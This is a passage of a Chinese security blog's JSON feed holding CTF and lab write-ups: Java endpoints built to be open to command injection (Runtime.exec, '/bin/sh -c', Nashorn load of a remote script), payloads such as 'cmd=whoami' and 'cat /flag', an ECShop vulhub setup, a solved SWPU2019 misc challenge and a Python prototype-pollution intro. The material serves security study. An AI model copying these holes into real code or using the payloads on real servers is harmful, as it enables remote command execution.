请求，针对性大量请求还是能提高命中的概率。</p>\n<p>那么这种攻击有什么办法解决呢？</p>\n<p>小弟就来丢一个完美的解决的方案？</p>\n<blockquote>\n<p>原理:</p>\n<p>通过控制 2 次的 DNS 查询请求的间隔低于 TTL 值，确保两次查询的结果一致。</p>\n<p>技术实现:</p>\n<p>所以代码写一个请求判断，Linux 系统修改默认的 TTL 值为 10, 即可很轻松解决这个问题。</p>\n</blockquote>\n<h2 id=\"rce\"><a class=\"anchor\" href=\"#rce\">#</a> rce</h2>\n<h3 id=\"runtime-exec\"><a class=\"anchor\" href=\"#runtime-exec\">#</a> runtime exec</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/runtime/exec\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\">CommandExec</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> cmd<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">Runtime</span> run <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">StringBuilder</span> sb <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">Process</span> p <span class=\"token operator\">=</span> run<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token class-name\">BufferedInputStream</span> in <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedInputStream</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token class-name\">BufferedReader</span> inBr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">String</span> tmpStr<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>tmpStr <span class=\"token operator\">=</span> inBr<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>tmpStr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">exitValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token string\">\"Command exec failed!!\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>inBr<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>in<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">return</span> e<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">return</span> sb<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>payload：cmd=whoami</p>\n<h3 id=\"processbuilder\"><a class=\"anchor\" href=\"#processbuilder\">#</a> processBuilder</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/ProcessBuilder\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">processBuilder</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> cmd<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">StringBuilder</span> sb <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> arrCmd <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> cmd<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token class-name\">ProcessBuilder</span> processBuilder <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span>arrCmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token class-name\">Process</span> p <span class=\"token operator\">=</span> processBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">BufferedInputStream</span> in <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedInputStream</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token class-name\">BufferedReader</span> inBr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token class-name\">String</span> tmpStr<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>tmpStr <span class=\"token operator\">=</span> inBr<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>tmpStr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">return</span> e<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">return</span> sb<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>cmd=whoami</p>\n<h3 id=\"js\"><a class=\"anchor\" href=\"#js\">#</a> js</h3>\n<p>js 文件：</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// 导入 Java 的 Runtime 和 Scanner 类</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">var</span> Runtime <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">var</span> Scanner <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.util.Scanner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 要执行的命令，这里用 whoami 方便查看当前用户</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">var</span> cmd <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"cat\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 可以通过这样的方式 cat /flag// 不能直接在一个字符串中，得隔开</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 执行命令</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">var</span> proc <span class=\"token operator\">=</span> Runtime<span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 等待命令执行完成</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    proc<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\">// 读取命令的标准输出流</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">var</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">(</span>proc<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">useDelimiter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\\\A\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">var</span> output <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"no output\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\">// 打印结果到服务器控制台（Nashorn 的 print）</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Command output: \"</span> <span class=\"token operator\">+</span> output<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 出现异常时打印错误信息</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error executing command: \"</span> <span class=\"token operator\">+</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/jscmd\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">jsEngine</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> jsurl<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// js nashorn javascript ecmascript  </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">ScriptEngine</span> engine <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ScriptEngineManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getEngineByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"js\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">Bindings</span> bindings <span class=\"token operator\">=</span> engine<span class=\"token punctuation\">.</span><span class=\"token function\">getBindings</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ScriptContext</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ENGINE_SCOPE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">String</span> cmd <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"load(\\\"%s\\\")\"</span><span class=\"token punctuation\">,</span> jsurl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>engine<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> bindings<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"image-20250710111939201\"><a class=\"anchor\" href=\"#image-20250710111939201\">#</a> <img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202507101119434.png\" alt=\"image-20250710111939201\" /></h4>\n<p>也是可以了</p>\n",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/",
            "url": "http://odiws.github.io/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/",
            "title": "ecshop复现",
            "date_published": "2025-06-17T03:38:05.000Z",
            "content_html": "<p>首先先起 docker：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker-compose</span> up <span class=\"token parameter variable\">-d</span>      ----d这个配置是都起，不然数据库可能就起不来，直接报错</pre></td></tr></table></figure><p>然后 docker ps 找到这个的容器号，</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@hcss-ecs-7f85:~/靶场/vulhub-master/ecshop/xianzhi-2017-02-82239600<span class=\"token comment\"># docker ps </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                                   NAMES</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>af16791ab7eb   vulhub/ecshop:3.6.0   <span class=\"token string\">\"docker-php-entrypoi…\"</span>   <span class=\"token number\">12</span> minutes ago   Up <span class=\"token number\">12</span> minutes   <span class=\"token number\">0.0</span>.0.0:8081-<span class=\"token operator\">></span><span class=\"token number\">80</span>/tcp, :::8081-<span class=\"token operator\">></span><span class=\"token number\">80</span>/tcp   xianzhi20170282239600_ecshop36_1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>32164643c5c7   vulhub/ecshop:2.7.3   <span class=\"token string\">\"docker-php-entrypoi…\"</span>   <span class=\"token number\">12</span> minutes ago   Up <span class=\"token number\">4</span> minutes    <span class=\"token number\">0.0</span>.0.0:8080-<span class=\"token operator\">></span><span class=\"token number\">80</span>/tcp, :::8080-<span class=\"token operator\">></span><span class=\"token number\">80</span>/tcp   xianzhi20170282239600_ecshop27_1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>3b79c717fdb1   mysql:5.5             <span class=\"token string\">\"docker-entrypoint.s…\"</span>   <span class=\"token number\">12</span> minutes ago   Up <span class=\"token number\">12</span> minutes   <span class=\"token number\">3306</span>/tcp                                xianzhi20170282239600_mysql_1</pre></td></tr></table></figure><p>我的报了一下错，可以</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> xianzhi20170282239600_mysql_1 mysql <span class=\"token parameter variable\">-uroot</span> <span class=\"token parameter variable\">-proot</span></pre></td></tr></table></figure><p>这个名字是在那个起的时候开始的几行就是了</p>\n<pre><code>root@hcss-ecs-7f85:~/靶场/vulhub-master/ecshop/xianzhi-2017-02-82239600# docker-compose up -d\nCreating network &quot;xianzhi20170282239600_default&quot; with the default driver\nCreating xianzhi20170282239600_mysql_1 ... \nCreating xianzhi20170282239600_mysql_1 ... done\nCreating xianzhi20170282239600_ecshop36_1 ... \nCreating xianzhi20170282239600_ecshop27_1 ... \nCreating xianzhi20170282239600_ecshop27_1\nCreating xianzhi20170282239600_ecshop36_1 ... done\n</code></pre>\n<p>然后就可以看看有些什么</p>\n<p>然后就是 /install 安装，配置数据库时的地址是 mysql,root/root, 数据库名字为 ecshop</p>\n<p>然后就进来了</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202506171144560.png\" alt=\"image-20250617114401629\" /></p>\n",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/05/21/sqltest/",
            "url": "http://odiws.github.io/2025/05/21/sqltest/",
            "title": "sqltest",
            "date_published": "2025-05-21T06:01:19.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/05/21/SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/",
            "url": "http://odiws.github.io/2025/05/21/SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/",
            "title": "[SWPU2019]你有没有好好看网课?",
            "date_published": "2025-05-21T05:12:59.000Z",
            "content_html": "<h2 id=\"swpu2019你有没有好好看网课\"><a class=\"anchor\" href=\"#swpu2019你有没有好好看网课\">#</a> [SWPU2019] 你有没有好好看网课？</h2>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211314744.png\" alt=\"image-20250521131427598\" /></p>\n<p>打开有两个文件，需要解压，先考虑是不是伪加密，好像不是</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211315789.png\" alt=\"image-20250521131551618\" /></p>\n<p>若是伪加密，就是 00 00，01 的意思就是确实是加密了</p>\n<p>flag3 给了解压密码提示：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211318785.png\" alt=\"image-20250521131803710\" /></p>\n<p>掩码一下</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211318219.png\" alt=\"image-20250521131837104\" /></p>\n<p>拿到密码：</p>\n<pre><code>183792\n</code></pre>\n<p>解压出来就是一个 docx 文件和一个音频文件</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211319682.png\" alt=\"image-20250521131925403\" /></p>\n<p>给了 5.20，711 的提示，估计是在文件的 5.20-7.11 之间有个提示，可以看一下</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211329602.png\" alt=\"image-20250521132952365\" /></p>\n<p>在 5.63 秒这里有一个信息</p>\n<pre><code>..... ../... ./... ./... ../\n</code></pre>\n<h4 id=\"敲击码\"><a class=\"anchor\" href=\"#敲击码\">#</a> 敲击码</h4>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211336384.png\" alt=\"image-20250521133622307\" /></p>\n<p>以 / 为划分：</p>\n<pre><code>..... ../... ./... ./... ../\n  5,2     3,1    3,1    3,2\n   W       L      L      M\n</code></pre>\n<p>在 7.33 这里又找到了一个信息：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211331837.png\" alt=\"image-20250521133157642\" /></p>\n<pre><code>dXBfdXBfdXA=\n</code></pre>\n<pre><code>C:\\Users\\86182&gt;php -r &quot;var_dump(base64_decode('dXBfdXBfdXA='));&quot;\nCommand line code:1:\nstring(8) &quot;up_up_up&quot;\n</code></pre>\n<p>联合一下就是：</p>\n<pre><code>wllmup_up_up\n</code></pre>\n<p>解压搜 flag 可得：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211337168.png\" alt=\"image-20250521133755090\" /></p>\n<pre><code>swpuctf&#123;A2e_Y0u_Ok?&#125;\n</code></pre>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTA5NDQ5NDk0\">https://blog.csdn.net/mochu7777777/article/details/109449494</span></p>\n",
            "tags": [
                "misc",
                "音频类",
                "敲击码"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "url": "http://odiws.github.io/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "title": "python原型链污染",
            "date_published": "2025-05-14T07:42:34.000Z",
            "content_html": "<h2 id=\"python原型链污染\"><a class=\"anchor\" href=\"#python原型链污染\">#</a> python 原型链污染</h2>\n<h3 id=\"py原型链污染基础原理\"><a class=\"anchor\" href=\"#py原型链污染基础原理\">#</a> py 原型链污染基础原理：</h3>\n<p><strong>（Python 则是对类属性值的污染）</strong></p>\n<pre><code>Python原型链污染是一种通过修改对象原型链中的属性，导致程序行为偏离预期的攻击技术。其核心原理与JavaScript原型链污染类似，但实现方式因语言特性而有所差异。\n\n*****Python则是对类属性值的污染\n\n​​原型继承特性​​\nPython中每个对象通过__class__属性指向其所属类，类通过__base__属性指向父类。当访问对象属性时，若当前对象/类中未定义，会沿原型链向上查找14。\n​​污染条件​​\n需要存在递归合并函数（如merge）且未对特殊属性过滤\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Config</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    is_admin <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">set_config</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_config</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        